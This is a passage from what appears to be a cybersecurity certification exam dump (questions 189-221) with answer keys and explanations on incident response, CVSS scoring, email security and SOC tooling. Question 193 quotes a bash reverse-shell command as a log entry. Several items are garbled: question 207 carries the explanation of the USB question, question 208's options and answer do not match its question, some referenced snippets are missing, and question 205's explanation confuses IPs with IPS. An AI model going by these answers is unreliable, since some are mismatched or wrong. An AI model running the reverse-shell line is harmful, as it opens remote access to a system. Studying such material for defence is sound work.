offering. SOAR solutions help \nsecurity teams to collect inputs from various sources, such as EDR agents, firewalls, or SIEM \nsystems, and perform analysis and triage using a combination of human and machine power. \nSOAR solutions also allow security teams to define and execute incident response procedures in \na digital workflow format, using automation to perform low-level tasks or actions, such as blocking \nan IP address or quarantining a device. SOAR solutions can help security teams to improve \nefficiency, consistency, and scalability of their operations, as well as reduce mean time to detect \n(MTTD) and mean time to respond (MTTR) to threats. The other options are not as suitable as  \nSOAR, as they do not match the description or purpose of the recommendation. SIEM (Security \nInformation and Event Management) is a software solution that collects and analyzes data from \nvarious sources, such as logs, events, or alerts, and provides security monitoring, threat \ndetection, and incident response capabilities. SIEM solutions can help security teams to gain \nvisibility, correlation, and context of their security data, but they do not provide automation or \norchestration features like SOAR solutions. SLA (Service Level Agreement) is a document that \ndefines the expectations and responsibilities between a service provider and a customer, such as \n\n\n \nthe quality, availability, or performance of the service. SLAs can help to manage customer \nexpectations, formalize communication, and improve productivity and relationships, but they do \nnot help to implement technical recommendations like SOAR solutions. IoC (Indicator of \nCompromise) is a piece of data or evidence that suggests a system or network has been \ncompromised by a threat actor, such as an IP address, a file hash, or a registry key. IoCs can \nhelp to identify and analyze malicious activities or incidents, but they do not help to implement \nresponse actions like SOAR solutions.  \n  \n  \nQUESTION 189  \nAn end-of-life date was announced for a widely used OS. A business-critical function is performed \nby some machinery that is controlled by a PC, which is utilizing the OS that is approaching the \nend-of-life date. Which of the following best describes a security analyst's concern?  \n  \nA. Any discovered vulnerabilities will not be remediated.  \nB. An outage of machinery would cost the organization money.  \nC. Support will not be available for the critical machinery.  \nD. There are no compensating controls in place for the OS.  \n  \nAnswer: A Explanation:  \nA security analyst's concern is that any discovered vulnerabilities in the OS that is approaching \nthe end-of-life date will not be remediated by the vendor, leaving the system exposed to potential \nattacks. The other options are not directly related to the security analyst's role or responsibility.   \n  \n  \nQUESTION 190  \nWhich of the following describes the best reason for conducting a root cause analysis?  \n  \nA. The root cause analysis ensures that proper timelines were documented.  \nB. The root cause analysis allows the incident to be properly documented for reporting.  \nC. The root cause analysis develops recommendations to improve the process.  \nD. The root cause analysis identifies the contributing items that facilitated the event.  \n  \nAnswer: D Explanation:  \nThe root cause analysis identifies the contributing items that facilitated the event is the best \nreason for conducting a root cause analysis, as it reflects the main goal and benefit of this \nproblem-solving approach. A root cause analysis (RCA) is a process of discovering the root \ncauses of problems in order to identify appropriate solutions. A root cause is the core issue or \nfactor that sets in motion the entire cause-and-effect chain that leads to the problem. A root cause \nanalysis assumes that it is more effective to systematically prevent and solve underlying issues \nrather than just treating symptoms or putting out fires. A root cause analysis can be performed \nusing various methods, tools, and techniques that help to uncover the causes of problems, such \nas events and causal factor analysis, change analysis, barrier analysis, or fishbone diagrams. A \nroot cause analysis can help to improve quality, performance, safety, or efficiency by finding and \neliminating the sources of problems. The other options are not as accurate as the root cause \nanalysis identifies the contributing items that facilitated the event, as they do not capture the \nessence or value of conducting a root cause analysis. The root cause analysis ensures that \nproper timelines were documented is a possible outcome or benefit of conducting a root cause \nanalysis, but it is not the best reason for doing so. Documenting timelines can help to establish \nthe sequence of events and actions that led to the problem, but it does not necessarily identify or \naddress the root causes. The root cause analysis allows the incident to be properly documented \nfor reporting is also a possible outcome or benefit of conducting a root cause analysis, but it is \nnot the best reason for doing so. Documenting and reporting incidents can help to communicate \n\n\n \nand share information about problems and solutions, but it does not necessarily identify or \naddress  \nthe root causes. The root cause analysis develops recommendations to improve the process is \nanother possible outcome or benefit of conducting a root cause analysis, but it is not the best \nreason for doing so. Developing recommendations can help to implement solutions and prevent \nfuture problems, but it does not necessarily identify or address the root causes.  \n  \n  \nQUESTION 191  \nWhich of the following concepts is using an API to insert bulk access requests from a file into an \nidentity management system an example of?  \n  \nA. Command and control  \nB. Data enrichment  \nC. Automation  \nD. Single sign-on  \n  \nAnswer: C Explanation:  \nAutomation is the best concept to describe the example, as it reflects the use of technology to \nperform tasks or processes without human intervention. Automation can help to improve \nefficiency, accuracy, consistency, and scalability of various operations, such as identity and \naccess management (IAM). IAM is a security framework that enables organizations to manage \nthe identities and access rights of users and devices across different systems and applications. \nIAM can help to ensure that only authorized users and devices can access the appropriate \nresources at the appropriate time and for the appropriate purpose. IAM can involve various tasks \nor processes, such as authentication, authorization, provisioning, deprovisioning, auditing, or \nreporting. Automation can help to simplify and streamline these tasks or processes by using \nsoftware tools or scripts that can execute predefined actions or workflows based on certain \ntriggers or conditions. For example, automation can help to create, update, or delete user \naccounts in bulk based on a file or a database, rather than manually entering or modifying each \naccount individually. The example in the question shows that an API is used to insert bulk access \nrequests from a file into an identity management system. An API (Application Programming \nInterface) is a set of rules or specifications that defines how different software components or \nsystems can communicate and exchange data with each other. An API can help to enable \nautomation by providing a standardized and consistent way to access and manipulate data or \nfunctionality of a software component or system. The example in the question shows that an API \nis used to automate the process of inserting bulk access requests from a file into an identity \nmanagement system, rather than manually entering each request one by one. The other options \nare not correct, as they describe different concepts or techniques. Command and control is a \nterm that refers to the ability of an attacker to remotely control a compromised system or device, \nsuch as using malware or backdoors. Command and control is not related to what is described in \nthe example. Data enrichment is a term that refers to the process of enhancing or augmenting \nexisting data with additional information from external sources, such as adding demographic or \nbehavioral attributes to customer profiles. Data enrichment is not related to what is described in \nthe example. Single sign-on is a term that refers to an authentication method that allows users to \naccess multiple systems or applications with one set of credentials, such as using a single \nusername and password for different websites or services. Single sign-on is not related to what is \ndescribed in the example.  \n  \n  \nQUESTION 192  \n\n\n \nA SOC analyst recommends adding a layer of defense for all endpoints that will better protect \nagainst external threats regardless of the device's operating system. Which of the following best \nmeets this requirement?  \n  \nA. SIEM  \nB. CASB  \nC. SOAR  \nD. EDR  \n  \nAnswer: D Explanation:  \nEDR stands for Endpoint Detection and Response, which is a layer of defense that monitors \nendpoints for malicious activity and provides automated or manual response capabilities. EDR \ncan protect against external threats regardless of the device's operating system, as it can detect \nand respond to attacks based on behavioral analysis and threat intelligence. EDR is also one of \nthe tools that CompTIA CySA+ covers in its exam objectives  \n  \n  \nQUESTION 193  \nA security analyst identified the following suspicious entry on the host-based IDS logs:  \n  \nbash -i >& /dev/tcp/10.1.2.3/8080 0>&1  \n  \nWhich of the following shell scripts should the analyst use to most accurately confirm if the \nactivity is ongoing?  \n  \nA. #!/bin/bash nc 10.1.2.3 8080 -vv >dev/null && echo \"Malicious activity\" || echo \n\"OK\" B. #!/bin/bash ps -fea | grep 8080 >dev/null && echo \"Malicious activity\" || \necho \"OK\" C. #!/bin/bash ls /opt/tcp/10.1.2.3/8080 >dev/null && echo \"Malicious \nactivity\" || echo \"OK\" D. #!/bin/bash netstat -antp | grep 8080 >dev/null && echo \n\"Malicious activity\" || echo \"OK\"  \n  \nAnswer: D Explanation:  \nThe suspicious entry on the host-based IDS logs indicates that a reverse shell was executed on \nthe host, which connects to the remote IP address 10.1.2.3 on port 8080. The shell script option \nD uses the netstat command to check if there is any active connection to that IP address and \nport, and prints \"Malicious activity\" if there is, or \"OK\" otherwise. This is the most accurate way to \nconfirm if the reverse shell is still active, as the other options may not detect the connection or \nmay produce false positives.  \n  \n  \nQUESTION 194  \nA company is concerned with finding sensitive file storage locations that are open to the public. \nThe current internal cloud network is flat. Which of the following is the best solution to secure the \nnetwork?  \n  \nA. Implement segmentation with ACLs.  \nB. Configure logging and monitoring to the SIEM.  \nC. Deploy MFA to cloud storage locations.  \nD. Roll out an IDS.  \n  \nAnswer: A Explanation:  \n\n\n \nImplementing segmentation with ACLs is the best solution to secure the network. Segmentation is \nthe process of dividing a network into smaller subnetworks, or segments, based on criteria such \nas function, location, or security level. Segmentation can help improve the network performance, \nscalability, and manageability, as well as enhance the network security by isolating the sensitive \nor critical data and systems from the rest of the network. ACLs are Access Control Lists, which \nare rules or policies that specify which users, devices, or applications can access a network \nsegment or resource, and which actions they can perform. ACLs can help enforce the principle of \nleast privilege, and prevent unauthorized or malicious access to the network segments or \nresources.   \n  \n  \nQUESTION 195  \nA security analyst is reviewing the findings of the latest vulnerability report for a company's web \napplication. The web application accepts files for a Bash script to be processed if the files match \na given hash. The analyst is able to submit files to the system due to a hash collision. Which of \nthe following should the analyst suggest to mitigate the vulnerability with the fewest changes to \nthe current script and infrastructure?  \n  \nA. Deploy a WAF to the front of the application.  \nB. Replace the current MD5 with SHA-256.  \nC. Deploy an antivirus application on the hosting system.  \nD. Replace the MD5 with digital signatures.  \n  \nAnswer: B Explanation:  \nThe vulnerability that the security analyst is able to exploit is a hash collision, which is a situation \nwhere two different files produce the same hash value. Hash collisions can allow an attacker to \nbypass the integrity or authentication checks that rely on hash values, and submit malicious files \nto the system. The web application uses MD5, which is a hashing algorithm that is known to be \nvulnerable to hash collisions. Therefore, the analyst should suggest replacing the current MD5 \nwith SHA-256, which is a more secure and collision-resistant hashing algorithm.   \n  \n  \nQUESTION 196  \nA security analyst needs to mitigate a known, exploited vulnerability related to an attack vector \nthat embeds software through the USB interface. Which of the following should the analyst do \nfirst?  \n  \nA. Conduct security awareness training on the risks of using unknown and unencrypted USBs.  \nB. Write a removable media policy that explains that USBs cannot be connected to a company \nasset.  \nC. Check configurations to determine whether USB ports are enabled on company assets.  \nD. Review logs to see whether this exploitable vulnerability has already impacted the company.  \n  \nAnswer: C Explanation:  \nUSB ports are a common attack vector that can be used to deliver malware, steal data, or \ncompromise systems. The first step to mitigate this vulnerability is to check the configurations of \nthe company assets and disable or restrict the USB ports if possible. This will prevent \nunauthorized devices from being connected and reduce the attack surface. The other options are \nalso important, but they are not the first priority in this scenario.  \n  \n  \nQUESTION 197  \n\n\n \nA systems administrator receives reports of an internet-accessible Linux server that is running \nvery sluggishly. The administrator examines the server, sees a high amount of memory utilization, \nand suspects a DoS attack related to half-open TCP sessions consuming memory. Which of the \nfollowing tools would best help to prove whether this server was experiencing this behavior?  \n  \nA. Nmap  \nB. TCPDump  \nC. SIEM  \nD. EDR  \n  \nAnswer: B Explanation:  \nTCPDump is the best tool to prove whether the server was experiencing a DoS attack related to \nhalf- open TCP sessions consuming memory. TCPDump is a command-line tool that can capture \nand analyze network traffic, such as TCP, UDP, and ICMP packets. TCPDump can help the \nadministrator to identify the source and destination of the traffic, the TCP flags and sequence \nnumbers, the packet size and frequency, and other information that can indicate a DoS attack. A \nDoS attack related to half- open TCP sessions is also known as a SYN flood attack, which is a \ntype of volumetric attack that aims to exhaust the network bandwidth or resources of the target \nserver by sending a large amount of TCP SYN requests and ignoring the TCP SYN-ACK \nresponses. This creates a backlog of half-open connections on the server, which consume \nmemory and CPU resources, and prevent legitimate connections from being established. \nTCPDump can help the administrator to detect a SYN flood attack by looking for a high number \nof TCP SYN packets with different source IP addresses, a low number of TCP SYN-ACK packets, \nand a very low number of TCP ACK packets.  \n  \n  \nQUESTION 198  \nA security analyst is validating a particular finding that was reported in a web application \nvulnerability scan to make sure it is not a false positive. The security analyst uses the snippet \nbelow:  \n  \n  \n  \nWhich of the following vulnerability types is the security analyst validating?  \n  \nA. Directory traversal  \nB. XSS  \nC. XXE  \nD. SSRF  \n  \nAnswer: B Explanation:  \nXSS (cross-site scripting) is the vulnerability type that the security analyst is validating, as the \nsnippet shows an attempt to inject a script tag into the web application. XSS is a web security \nvulnerability that allows an attacker to execute arbitrary JavaScript code in the browser of another \nuser who visits the vulnerable website. XSS can be used to perform various malicious actions, \nsuch as stealing cookies, session hijacking, phishing, or defacing websites. The other \n\n\n \nvulnerability types are not relevant to the snippet, as they involve different kinds of attacks. \nDirectory traversal is an attack that allows an attacker to access files and directories that are \noutside of the web root folder. XXE (XML external entity) injection is an attack that allows an \nattacker to interfere with an application's processing of XML data, and potentially access files or \nsystems. SSRF (server-side request forgery) is an attack that allows an attacker to induce the \nserver-side application to make requests to an unintended location.   \n  \n  \nQUESTION 199  \nWhich of the following is the most important factor to ensure accurate incident response \nreporting?  \n  \nA. A well-defined timeline of the events  \nB. A guideline for regulatory reporting  \nC. Logs from the impacted system  \nD. A well-developed executive summary  \n  \nAnswer: A Explanation:  \nA well-defined timeline of the events is the most important factor to ensure accurate incident \nresponse reporting, as it provides a clear and chronological account of what happened, when it \nhappened, who was involved, and what actions were taken. A timeline helps to identify the root \ncause of the incident, the impact and scope of the damage, the effectiveness of the response, \nand the lessons learned for future improvement. A timeline also helps to communicate the \nincident to relevant stakeholders, such as management, legal, regulatory, or media entities. The \nother factors are also important for incident response reporting, but they are not as essential as a \nwell-defined timeline.   \n  \n  \nQUESTION 200  \nA security analyst is trying to detect connections to a suspicious IP address by collecting the \npacket captures from the gateway. Which of the following commands should the security analyst \nconsider running?  \n  \nA. grep [IP address] packets.pcap  \nB. cat packets.pcap | grep [IP Address]  \nC. tcpdump -n -r packets.pcap host [IP address]  \nD. strings packets.pcap | grep [IP Address]  \n  \nAnswer: C Explanation: tcpdump is a command-line tool that can capture and analyze \nnetwork packets from a given interface or file. The -n option prevents tcpdump from resolving \nhostnames, which can speed up the analysis. The -r option reads packets from a file, in this \ncase packets.pcap. The host [IP address] filter specifies that tcpdump should only display \npackets that have the given IP address as either the source or the destination. This command \ncan help the security analyst detect connections to a suspicious IP address by collecting the \npacket captures from the gateway.   \n  \n  \nQUESTION 201  \nA security analyst reviews the latest vulnerability scans and observes there are vulnerabilities \nwith similar CVSSv3 scores but different base score metrics. Which of the following attack \nvectors should the analyst remediate first?  \n  \n\n\n \nA. CVSS:3.0/AV:P/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H  \nB. CVSS:3.0/AV:A/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H  \nC. CVSS:3.0/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H  \nD. CVSS:3.0/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H  \n  \nAnswer: C  \n  \n  \nQUESTION 202  \nA security analyst must review a suspicious email to determine its legitimacy. Which of the \nfollowing should be performed? (Choose two.)  \n  \nA. Evaluate scoring fields, such as Spam Confidence Level and Bulk Complaint Level  \nB. Review the headers from the forwarded email  \nC. Examine the recipient address field  \nD. Review the Content-Type header  \nE. Evaluate the HELO or EHLO string of the connecting email server  \nF. Examine the SPF, DKIM, and DMARC fields from the original email  \n  \nAnswer: BF  \n  \n  \nQUESTION 203  \nA vulnerability analyst received a list of system vulnerabilities and needs to evaluate the relevant \nimpact of the exploits on the business. Given the constraints of the current sprint, only three can \nbe remediated. Which of the following represents the least impactful risk, given the CVSS3.1 \nbase scores?  \n  \nA. AV:N/AC:H/PR:H/UI:R/S:U/C:H/I:H/A:L - Base Score 6.0  \nB. AV:N/AC:H/PR:H/UI:N/S:C/C:H/I:H/A:L - Base Score 7.2  \nC. AV:N/AC:H/PR:H/UI:R/S:U/C:H/I:H/A:H - Base Score 6.4  \nD. AV:N/AC:H/PR:N/UI:N/S:C/C:L/I:L/A:L - Base Score 6.5  \n  \nAnswer: A Explanation:  \nThis option represents the least impactful risk because it has the lowest base score among the \nfour options, and it also requires high privileges, user interaction, and high attack complexity to \nexploit, which reduces the likelihood of a successful attack.  \n  \n  \nQUESTION 204  \nA recent vulnerability scan resulted in an abnormally large number of critical and high findings \nthat require patching. The SLA requires that the findings be remediated within a specific amount \nof time. Which of the following is the best approach to ensure all vulnerabilities are patched in \naccordance with the SLA?  \n  \nA. Integrate an IT service delivery ticketing system to track remediation and closure  \nB. Create a compensating control item until the system can be fully patched  \nC. Accept the risk and decommission current assets as end of life  \nD. Request an exception and manually patch each system  \n  \nAnswer: A Explanation:  \n\n\n \nIntegrating an IT service delivery ticketing system to track remediation and closure is the best \napproach to ensure all vulnerabilities are patched in accordance with the SLA. A ticketing system \nis a software tool that helps manage, organize, and track the tasks and workflows related to IT \nservice delivery, such as incident management, problem management, change management, \nand vulnerability management. A ticketing system can help the security team to prioritize, assign, \nmonitor, and document the remediation of the vulnerabilities, and to ensure that they are \ncompleted within the specified time frame and quality standards. A ticketing system can also help \nthe security team to communicate and collaborate with other teams, such as the IT operations \nteam, the development team, and the business stakeholders, and to report on the status and \nprogress of the remediation efforts. Creating a compensating control item, accepting the risk, and \nrequesting an exception are not the best approaches to ensure all vulnerabilities are patched in \naccordance with the SLA, as they do not address the root cause of the problem, which is the \nlarge number of critical and high findings that require patching. These approaches may also \nintroduce more risks or challenges for the security team, such as compliance issues, resource \nconstraints, or business impacts.  \n  \n  \nQUESTION 205  \nWhich of the following would help an analyst to quickly find out whether the IP address in a SIEM \nalert is a known-malicious IP address?  \n  \nA. Join an information sharing and analysis center specific to the company's industry  \nB. Upload threat intelligence to the IPS in STIX'TAXII format  \nC. Add data enrichment for IPs in the ingestion pipeline  \nD. Review threat feeds after viewing the SIEM alert  \n  \nAnswer: C Explanation:  \nThe best option to quickly find out whether the IP address in a SIEM alert is a known-malicious IP \naddress is C. Add data enrichment for IPS in the ingestion pipeline. Data enrichment is the \nprocess of adding more information and context to raw data, such as IP addresses, by using \nexternal sources. Data enrichment can help analysts to gain more insights into the nature and \norigin of the threats they face, and to prioritize and respond to them accordingly. Data enrichment \nfor IPS (Intrusion Prevention System) means that the IPS can use enriched data to block or alert \non malicious traffic based on various criteria, such as geolocation, reputation, threat intelligence, \nor behavior. By adding data enrichment for IPS in the ingestion pipeline, analysts can leverage \nthe IPS's capabilities to filter out known-malicious IP addresses before they reach the SIEM, or to \ntag them with relevant information for further analysis. This can save time and resources for the \nanalysts, and improve the accuracy and efficiency of the SIEM. The other options are not as \neffective or efficient as data enrichment for IPS in the ingestion pipeline. Joining an information \nsharing and analysis center (ISAC) specific to the company's industry (A) can provide valuable \nthreat intelligence and best practices, but it may not be timely or comprehensive enough to cover \nall possible malicious IP addresses. Uploading threat intelligence to the IPS in STIX/TAXII format \n(B) can help the IPS to identify and block malicious IP addresses based on standardized \nindicators of compromise, but it may require manual or periodic updates and integration with the \nSIEM. Reviewing threat feeds after viewing the SIEM alert (D) can help analysts to verify and \ncontextualize the malicious IP addresses, but it may be too late or too slow to prevent or mitigate \nthe damage. Therefore, C is the best option among the choices given.  \n  \n  \nQUESTION 206  \nAn organization was compromised, and the usernames and passwords of all employees were \nleaked online. Which of the following best describes the remediation that could reduce the impact \nof this situation?  \n\n\n \n  \nA. Multifactor authentication  \nB. Password changes  \nC. System hardening  \nD. Password encryption  \n  \nAnswer: A Explanation:  \nMultifactor authentication (MFA) is a security method that requires users to provide two or more \npieces of evidence to verify their identity, such as a password, a PIN, a fingerprint, or a one-time \ncode. MFA can reduce the impact of a credential leak because even if the attackers have the \nusernames and passwords of the employees, they would still need another factor to access the \norganization's systems and resources. Password changes, system hardening, and password \nencryption are also good security practices, but they do not address the immediate threat of \ncompromised credentials.  \n  \n  \nQUESTION 207  \nA company is deploying new vulnerability scanning software to assess its systems. The current \nnetwork is highly segmented, and the networking team wants to minimize the number of unique \nfirewall rules. Which of the following scanning techniques would be most efficient to achieve the \nobjective?  \n  \nA. Deploy agents on all systems to perform the scans  \nB. Deploy a central scanner and perform non-credentialed scans  \nC. Deploy a cloud-based scanner and perform a network scan  \nD. Deploy a scanner sensor on every segment and perform credentialed scans  \n  \nAnswer: A Explanation:  \nUSB ports are a common attack vector that can be used to deliver malware, steal data, or \ncompromise systems. The first step to mitigate this vulnerability is to check the configurations of \nthe company assets and disable or restrict the USB ports if possible. This will prevent \nunauthorized devices from being connected and reduce the attack surface. The other options are \nalso important, but they are not the first priority in this scenario.  \n  \n  \nQUESTION 208  \nAn organization's email account was compromised by a bad actor. Given the following \ninformation:  \n  \n\n\n \n  \n  \nWhich of the following is the length of time the team took to detect the threat?  \n  \nA. Data masking  \nB. Hashing  \nC. Watermarking  \nD. Encoding  \n  \nAnswer: C  \n  \n  \nQUESTION 209  \nA security administrator needs to import PII data records from the production environment to the \ntest environment for testing purposes. Which of the following would best protect data \nconfidentiality?  \n  \nA. Data masking  \nB. Hashing  \nC. Watermarking  \nD. Encoding  \n  \nAnswer: A Explanation:  \nData masking is a technique that replaces sensitive data with fictitious or anonymized data, while \npreserving the original format and structure of the data. This way, the data can be used for testing \npurposes without revealing the actual Pll information. Data masking is one of the best practices \nfor data analysis of confidential data.  \n\n\n \n  \n  \nQUESTION 210  \nThe email system administrator for an organization configured DKIM signing for all email \nlegitimately sent by the organization. Which of the following would most likely indicate an email is \nmalicious if the company's domain name is used as both the sender and the recipient?  \n  \nA. The message fails a DMARC check  \nB. The sending IP address is the hosting provider  \nC. The signature does not meet corporate standards  \nD. The sender and reply address are different  \n  \nAnswer: A  \n  \n  \nQUESTION 211  \nDuring an incident involving phishing, a security analyst needs to find the source of the malicious \nemail. Which of the following techniques would provide the analyst with this information?  \n  \nA. Header analysis  \nB. Packet capture  \nC. SSL inspection  \nD. Reverse engineering  \n  \nAnswer: A Explanation:  \nHeader analysis is the technique of examining the metadata of an email, such as the sender, \nrecipient, date, subject, and routing information. It can help to identify the source of a malicious \nemail by revealing the IP address and domain name of the originator, as well as any spoofing or \nredirection attempts.  \n  \n  \nQUESTION 212  \nAn analyst wants to ensure that users only leverage web-based software that has been \npreapproved by the organization. Which of the following should be deployed?  \n  \nA. Blocklisting  \nB. Allowlisting  \nC. Graylisting  \nD. Webhooks  \n  \nAnswer: B Explanation:  \nAllowlisting is a technique that allows only pre-approved web-based software to run on a system \nor network, while blocking all other software. Allowlisting can help prevent unauthorized or \nmalicious software from compromising the security of an organization. Allowlisting can be \nimplemented using various methods, such as application control, browser extensions, firewall \nrules, or proxy servers.   \n  \n  \nQUESTION 213  \nDuring a cybersecurity incident, one of the web servers at the perimeter network was affected by \nransomware. Which of the following actions should be performed immediately?  \n  \n\n\n \nA. Shut down the server.  \nB. Reimage the server.  \nC. Quarantine the server.  \nD. Update the OS to latest version.  \n  \nAnswer: C Explanation:  \nQuarantining the server is the best action to perform immediately, as it isolates the affected \nserver from the rest of the network and prevents the ransomware from spreading to other \nsystems or data. Quarantining the server also preserves the evidence of the ransomware attack, \nwhich can be useful for forensic analysis and law enforcement investigation. The other actions \nare not as urgent as quarantining the server, as they may not stop the ransomware infection, or \nthey may destroy valuable evidence. Shutting down the server may not remove the ransomware, \nand it may trigger a data deletion mechanism by the ransomware. Reimaging the server may \nrestore its functionality, but it will also erase any traces of the ransomware and make recovery of \nencrypted data impossible. Updating the OS to the latest version may fix some vulnerabilities, but \nit will not remove the ransomware or decrypt the data.   \n  \n  \nQUESTION 214  \nAn organization recently changed its BC and DR plans. Which of the following would best allow \nfor the incident response team to test the changes without any impact to the business?  \n  \nA. Perform a tabletop drill based on previously identified incident scenarios.  \nB. Simulate an incident by shutting down power to the primary data center.  \nC. Migrate active workloads from the primary data center to the secondary location.  \nD. Compare the current plan to lessons learned from previous incidents.  \n  \nAnswer: A Explanation:  \nPerforming a tabletop drill based on previously identified incident scenarios is the best way to test \nthe changes to the BC and DR plans without any impact to the business, as it is a low-cost and \nlow-risk method of exercising the plans and identifying any gaps or issues. A tabletop drill is a \ntype of BC/DR exercise that involves gathering key personnel from different departments and \nroles and discussing how they would respond to a hypothetical incident scenario. A tabletop drill \ndoes not involve any actual simulation or disruption of the systems or processes, but rather relies \non verbal communication and documentation review. A tabletop drill can help to ensure that \neveryone is familiar with the BC/DR plans, that the plans reflect the current state of the \norganization, and that the plans are consistent and coordinated across different functions. The \nother options are not as suitable as performing a tabletop drill, as they involve more cost, risk, or \nimpact to the business. Simulating an incident by shutting down power to the primary data center \nis a type of BC/DR exercise that involves creating an actual disruption or outage of a critical \nsystem or process, and observing how the organization responds and recovers. This type of \nexercise can provide a realistic assessment of the BC/DR capabilities, but it can also cause \nsignificant impact to the business operations, customers, and reputation. Migrating active \nworkloads from the primary data center to the secondary location is a type of BC/DR exercise \nthat involves switching over from one system or site to another, and verifying that the backup \nsystem or site can support the normal operations. This type of exercise can help to validate the \nfunctionality and performance of the backup system or site, but it can also incur high costs, \ncomplexity, and potential errors or failures. Comparing the current plan to lessons learned from \nprevious incidents is a type of BC/DR activity that involves reviewing past experiences and \noutcomes, and identifying best practices or improvement opportunities. This activity can help to \nupdate and refine the BC/DR plans, but it does not test or validate them in a simulated or actual \nscenario.  \n  \n\n\n \n  \nQUESTION 215  \nSecurity analysts review logs on multiple servers on a daily basis. Which of the following \nimplementations will give the best central visibility into the events occurring throughout the \ncorporate environment without logging in to the servers individually?  \n  \nA. Deploy a database to aggregate the logging  \nB. Configure the servers to forward logs to a SIEM  \nC. Share the log directory on each server to allow local access.  \nD. Automate the emailing of logs to the analysts.  \n  \nAnswer: B Explanation:  \nThe best implementation to give the best central visibility into the events occurring throughout the \ncorporate environment without logging in to the servers individually is B. Configure the servers to \nforward logs to a SIEM.  \nA SIEM (Security Information and Event Management) is a security solution that helps \norganizations detect, analyze, and respond to security threats before they disrupt business. SIEM \ntools collect, aggregate, and correlate log data from various sources across an organization's \nnetwork, such as applications, devices, servers, and users. SIEM tools also provide real-time \nalerts, dashboards, reports, and incident response capabilities to help security teams identify and \nmitigate cyberattacks.  \nBy configuring the servers to forward logs to a SIEM, the security analysts can have a central \nview of potential threats and monitor security incidents across the corporate environment without \nlogging in to the servers individually. This can save time, improve efficiency, and enhance \nsecurity posture. Deploying a database to aggregate the logging (A) may not provide the same \nlevel of analysis, correlation, and alerting as a SIEM tool. Sharing the log directory on each \nserver to allow local access © may not be scalable or secure for a large number of servers. \nAutomating the emailing of logs to the analysts (D) may not be timely or effective for real-time \nthreat detection and response. Therefore, B is the best option among the choices given.  \n  \n  \nQUESTION 216  \nFollowing a recent security incident, the Chief Information Security Officer is concerned with \nimproving visibility and reporting of malicious actors in the environment. The goal is to reduce the \ntime to prevent lateral movement and potential data exfiltration. Which of the following techniques \nwill best achieve the improvement?  \n  \nA. Mean time to detect  \nB. Mean time to respond  \nC. Mean time to remediate  \nD. Service-level agreement uptime  \n  \nAnswer: A Explanation:  \nMean time to detect (MTTD) is a metric that measures how quickly an organization can identify a \nsecurity incident or a malicious actor in the environment. Reducing MTTD can improve visibility \nand reporting of threats, as well as prevent lateral movement and data exfiltration by detecting \nthem sooner.  \n  \n  \nQUESTION 217  \n\n\n \nAfter identifying a threat, a company has decided to implement a patch management program to \nremediate vulnerabilities. Which of the following risk management principles is the company \nexercising?  \n  \nA. Transfer  \nB. Accept  \nC. Mitigate  \nD. Avoid  \n  \nAnswer: C Explanation:  \nMitigate is the best term to describe the risk management principle that the company is \nexercising, as it means to reduce the likelihood or impact of a risk. By implementing a patch \nmanagement program to remediate vulnerabilities, the company is mitigating the threat of \ncyberattacks that could exploit those vulnerabilities and compromise the security or functionality \nof the systems. The other terms are not as accurate as mitigate, as they describe different risk \nmanagement principles. Transfer means to shift the responsibility or burden of a risk to another \nparty, such as an insurer or a contractor. Accept means to acknowledge the existence of a risk \nand decide not to take any action to reduce it, usually because the risk is low or the cost of \nmitigation is too high. Avoid means to eliminate the possibility of a risk by changing the plans or \nactivities that could cause it, such as cancelling a project or discontinuing a service.  \n  \n  \nQUESTION 218  \nA security analyst discovers an ongoing ransomware attack while investigating a phishing email. \nThe analyst downloads a copy of the file from the email and isolates the affected workstation \nfrom the network. Which of the following activities should the analyst perform next?  \n  \nA. Wipe the computer and reinstall software  \nB. Shut down the email server and quarantine it from the network  \nC. Acquire a bit-level image of the affected workstation  \nD. Search for other mail users who have received the same file  \n  \nAnswer: D Explanation:  \nSearching for other mail users who have received the same file is the best activity to perform \nnext, as it helps to identify and contain the scope of the ransomware attack and prevent further \ndamage. Ransomware is a type of malware that encrypts files on a system and demands \npayment for their decryption. Ransomware can spread through phishing emails that contain \nmalicious attachments or links that download the ransomware. By searching for other mail users \nwho have received the same file, the analyst can alert them not to open it, delete it from their \ninboxes, and scan their systems for any signs of infection. The other activities are not as urgent \nor effective as searching for other mail users who have received the same file, as they do not \naddress the immediate threat of ransomware spreading or affecting more systems. Wiping the \ncomputer and reinstalling software may restore the functionality of the affected workstation, but it \nwill also erase any evidence of the ransomware attack and make recovery of encrypted files \nimpossible. Shutting down the email server and quarantining it from the network may stop the \ndelivery of more phishing emails, but it will also disrupt normal communication and operations for \nthe organization. Acquiring a bit-level image of the affected workstation may preserve the \nevidence of the ransomware attack, but it will not help to stop or remove the ransomware or \ndecrypt the files.  \n  \n  \nQUESTION 219  \n\n\n \nThe security analyst received the monthly vulnerability report. The following findings were \nincluded in the report:  \n  \n- \nFive of the systems only required a reboot to finalize the patch \napplication  \n- \nTwo of the servers are running outdated operating systems and \ncannot be patched  \n  \nThe analyst determines that the only way to ensure these servers cannot be compromised is to \nisolate them. Which of the following approaches will best minimize the risk of the outdated \nservers being compromised?  \n  \nA. Compensating controls  \nB. Due diligence  \nC. Maintenance windows  \nD. Passive discovery  \n  \nAnswer: A Explanation:  \nCompensating controls are the best approach to minimize the risk of the outdated servers being \ncompromised, as they can provide an alternative or additional layer of security when the primary \ncontrol is not feasible or effective. Compensating controls are security measures that are \nimplemented to mitigate the risk of a vulnerability or an attack when the primary control is not \nfeasible or effective. For example, if the servers are running outdated operating systems and \ncannot be patched, a compensating control could be to isolate them from the rest of the network, \nor to implement a firewall or an intrusion prevention system to monitor and block any malicious \ntraffic to or from the servers. Compensating controls can help reduce the likelihood or impact of \nan exploit, but they do not eliminate the risk completely. Therefore, the security analyst should \nalso consider upgrading or replacing the outdated servers as soon as possible.  \n  \n  \nQUESTION 220  \nThe vulnerability analyst reviews threat intelligence regarding emerging vulnerabilities affecting \nworkstations that are used within the company:  \n  \n  \n  \nWhich of the following vulnerabilities should the analyst be most concerned about, knowing that \nend users frequently click on malicious links sent via email?  \n  \nA. Vulnerability A  \nB. Vulnerability B  \nC. Vulnerability C  \nD. Vulnerability D  \n  \n\n\n \nAnswer: A  \n  \n  \nQUESTION 221  \nAn incident response analyst is taking over an investigation from another analyst. The \ninvestigation has been going on for the past few days. Which of the following steps is most \nimportant during the transition between the two analysts?  \n  \nA. Identify and discuss the lessons learned 